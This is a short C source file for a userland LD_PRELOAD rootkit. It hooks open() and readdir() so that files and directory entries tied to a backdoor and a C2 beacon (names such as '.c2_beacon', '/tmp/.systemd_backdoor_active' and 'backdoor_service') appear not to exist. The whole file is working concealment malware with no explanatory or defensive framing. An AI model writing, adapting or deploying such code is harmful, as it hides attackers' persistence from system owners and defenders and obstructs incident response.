#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <stdarg.h>

/* Hook open() — hide our marker files */
typedef int (*orig_open_t)(const char *pathname, int flags, ...);
static orig_open_t real_open = NULL;

int open(const char *pathname, int flags, ...) {
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    if (strstr(pathname, ".ld_preload_active") ||
        strstr(pathname, ".c2_beacon") ||
        strstr(pathname, "/tmp/.systemd_backdoor_active")) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) mode = va_arg(args, mode_t);
    va_end(args);
    return real_open(pathname, flags, mode);
}

/* Hook readdir — hide our process entries */
typedef struct dirent *(*orig_readdir_t)(DIR *);
static orig_readdir_t real_readdir = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "ld_preload_hook") ||
            strstr(entry->d_name, "c2_beacon") ||
            strstr(entry->d_name, "backdoor_service")) {
            continue;
        }
        break;
    }
    return entry;
}
